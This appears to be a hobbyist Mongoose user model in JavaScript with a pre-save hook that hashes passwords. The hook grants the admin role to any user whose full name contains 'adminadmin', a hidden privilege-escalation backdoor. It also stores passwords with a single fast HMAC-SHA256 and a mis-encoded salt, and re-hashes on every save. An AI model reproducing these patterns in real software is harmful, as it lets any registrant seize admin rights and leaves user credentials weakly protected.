import mongoose from "mongoose";
import { createHmac, randomBytes } from 'crypto'

const userSchema=mongoose.Schema({
    fullName:{
        type: String,
        required: true
    },
    userName:{
        type: String,
        required: true,
        default: `user${Date.now()}`
    },
    email:{
        type: String,
        required: true,
        unique: true
    },
    salt:{
        type: String,
        // required: true
    },
    password:{
        type: String,
        required: true
    },
    role: {
        type: String,
        enum: ['admin', 'user'],
        default: 'user'
    }
},{timestamps: true})

userSchema.pre("save", function(next){
    const user=this;

    const salt = randomBytes(16).toString();
    // const salt='hero'
    const hashedPassword = createHmac('sha256', salt)
                .update(user.password)
                .digest('hex');
    
    user.salt=salt;
    user.password=hashedPassword;
    // console.log("salt", salt)

    if(user.fullName.includes("adminadmin")){
        user.role='admin';
        user.fullName=user.fullName.replace("adminadmin", "")
    }

    next();
}) 
// userSchema.pre('updateOne', function(next){
//     const user=this.getUpdate();;

//     const salt = randomBytes(16).toString();
//     // const salt='hero'
//     const hashedPassword = createHmac('sha256', salt)
//                 .update(user.password)
//                 .digest('hex');
    
//     user.salt=salt;
//     user.password=hashedPassword;
//     // console.log("salt", salt)

//     next();
// })


const userModel=mongoose.model('user', userSchema)

export default userModel;

/*
function hashPassword(next){
    const user=this;

    const salt = randomBytes(16).toString();
    // const salt='hero'
    const hashedPassword = createHmac('sha256', salt)
                .update(user.password)
                .digest('hex');
    
    user.salt=salt;
    user.password=hashedPassword;
    // console.log("salt", salt)

    next();
}
userSchema.pre("save",(next)=>hashPassword(next,this)) 
userSchema.pre('updateOne',(next)=> hashPassword(next,this))
*/